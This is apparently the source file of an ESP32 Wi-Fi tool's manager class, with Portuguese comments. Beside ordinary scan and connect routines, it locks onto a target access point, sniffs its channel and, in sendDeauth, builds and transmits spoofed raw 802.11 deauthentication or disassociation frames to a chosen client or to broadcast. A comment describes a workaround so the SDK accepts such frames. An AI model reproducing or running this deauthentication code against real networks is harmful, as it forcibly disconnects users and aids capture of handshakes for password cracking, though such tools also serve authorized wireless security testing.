#include "wifi_manager.h"
#include "deauth_frame_builder.h"
#include <esp_wifi.h>
#include <cstring>
#include <cstdio>

void WifiManager::begin() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
}

int WifiManager::scan() {
  stopSniff();  // senao o radio fica preso no canal antigo, promiscuo, mas "esquecido" no estado
  int n = WiFi.scanNetworks();
  count_ = n > 0 ? n : 0;
  state_ = WifiState::IDLE;
  return n;
}

static bool validIndex(int index, int count) { return index >= 1 && index <= count; }

String WifiManager::ssidAt(int index) const {
  return validIndex(index, count_) ? WiFi.SSID(index - 1) : String("");
}

int WifiManager::rssiAt(int index) const {
  return validIndex(index, count_) ? WiFi.RSSI(index - 1) : 0;
}

bool WifiManager::secureAt(int index) const {
  return validIndex(index, count_) && WiFi.encryptionType(index - 1) != WIFI_AUTH_OPEN;
}

String WifiManager::bssidAt(int index) const {
  if (!validIndex(index, count_)) return String("");
  uint8_t *b = WiFi.BSSID(index - 1);
  if (!b) return String("");
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
  return String(buf);
}

int WifiManager::channelAt(int index) const {
  return validIndex(index, count_) ? WiFi.channel(index - 1) : 0;
}

String WifiManager::encryptionAt(int index) const {
  if (!validIndex(index, count_)) return String("unknown");
  switch (WiFi.encryptionType(index - 1)) {
    case WIFI_AUTH_OPEN: return "open";
    case WIFI_AUTH_WEP: return "wep";
    case WIFI_AUTH_WPA_PSK: return "wpa_psk";
    case WIFI_AUTH_WPA2_PSK: return "wpa2_psk";
    case WIFI_AUTH_WPA_WPA2_PSK: return "wpa_wpa2_psk";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "wpa2_enterprise";
    case WIFI_AUTH_WPA3_PSK: return "wpa3_psk";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "wpa2_wpa3_psk";
    case WIFI_AUTH_WAPI_PSK: return "wapi_psk";
    default: return "unknown";
  }
}

int WifiManager::indexForSsid(const String &ssid) const {
  for (int i = 1; i <= count_; i++) {
    if (ssidAt(i) == ssid) return i;
  }
  return 0;
}

bool WifiManager::connect(const String &ssid, const String &pass, uint32_t timeoutMs) {
  stopSniff();
  WiFi.disconnect();
  state_ = WifiState::CONNECTING;
  WiFi.begin(ssid.c_str(), pass.c_str());
  uint32_t start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < timeoutMs) {
    delay(250);
  }
  bool ok = connected();
  state_ = ok ? WifiState::CONNECTED : WifiState::IDLE;
  return ok;
}

void WifiManager::disconnect() {
  WiFi.disconnect();
  state_ = WifiState::IDLE;
}

bool WifiManager::lockChannel(int index) {
  if (!validIndex(index, count_)) return false;
  stopSniff();
  uint8_t *b = WiFi.BSSID(index - 1);
  if (!b) return false;
  memcpy(lockedBssid_, b, 6);
  lockedSsid_ = ssidAt(index);
  lockedChannel_ = WiFi.channel(index - 1);
  esp_wifi_set_channel((uint8_t)lockedChannel_, WIFI_SECOND_CHAN_NONE);
  state_ = WifiState::LOCKED;
  return true;
}

String WifiManager::lockedBssidString() const {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           lockedBssid_[0], lockedBssid_[1], lockedBssid_[2],
           lockedBssid_[3], lockedBssid_[4], lockedBssid_[5]);
  return String(buf);
}

void WifiManager::unlock() {
  stopSniff();
  state_ = WifiState::IDLE;
}

void WifiManager::startSniff(const SniffConfig &cfg) {
  if (state_ != WifiState::LOCKED && state_ != WifiState::SNIFFING) return;
  sniffer_.begin(lockedBssid_, lockedSsid_, cfg);
  state_ = WifiState::SNIFFING;
}

void WifiManager::stopSniff() {
  if (state_ == WifiState::SNIFFING) {
    sniffer_.end();
    state_ = WifiState::LOCKED;
  }
}

static bool parseMac(const String &s, uint8_t out[6]) {
  if (s.equalsIgnoreCase("broadcast")) {
    memset(out, 0xFF, 6);
    return true;
  }
  if (s.length() != 17) return false;
  unsigned int values[6];
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) != 6) {
    return false;
  }
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)values[i];
  return true;
}

bool WifiManager::sendDeauth(const String &target, uint16_t reason, const String &frameType) {
  if (state_ != WifiState::LOCKED && state_ != WifiState::SNIFFING) {
    Serial.printf("[deauth] recusado: estado atual e '%s', precisa estar locked/sniffing\n",
                  stateName().c_str());
    return false;
  }

  uint8_t mac[6];
  if (!parseMac(target, mac)) {
    Serial.printf("[deauth] recusado: target invalido '%s'\n", target.c_str());
    return false;
  }

  uint8_t fc0 = frameType == "disassoc" ? DeauthFrameBuilder::kFrameControlDisassoc
                                         : DeauthFrameBuilder::kFrameControlDeauth;
  uint8_t frame[26];
  DeauthFrameBuilder::build(mac, lockedBssid_, reason, frame, fc0);

  uint8_t curChannel = 0;
  wifi_second_chan_t curSecond;
  esp_wifi_get_channel(&curChannel, &curSecond);

  Serial.printf("[deauth] type=%s target=%s bssid_travado=%s reason=%u\n",
                frameType.c_str(), target.c_str(), lockedBssidString().c_str(), reason);
  Serial.printf("[deauth] canal travado=%d canal real do radio=%d\n", lockedChannel_, curChannel);
  Serial.print("[deauth] frame (26 bytes): ");
  for (int i = 0; i < 26; i++) {
    char b[4];
    snprintf(b, sizeof(b), "%02X ", frame[i]);
    Serial.print(b);
  }
  Serial.println();

  // en_sys_seq=true: deixa o driver preencher o numero de sequencia. Com false,
  // a SDK rejeita frame de deauth cru com "unsupport frame type" -- bug/restricao
  // conhecida do esp_wifi_80211_tx em builds recentes do IDF.
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
  Serial.printf("[deauth] esp_wifi_80211_tx -> %s (code %d)\n", esp_err_to_name(err), (int)err);

  return err == ESP_OK;
}

String WifiManager::stateName() const {
  switch (state_) {
    case WifiState::IDLE: return "idle";
    case WifiState::SCANNING: return "scanning";
    case WifiState::CONNECTING: return "connecting";
    case WifiState::CONNECTED: return "connected";
    case WifiState::LOCKED: return "locked";
    case WifiState::SNIFFING: return "sniffing";
  }
  return "unknown";
}
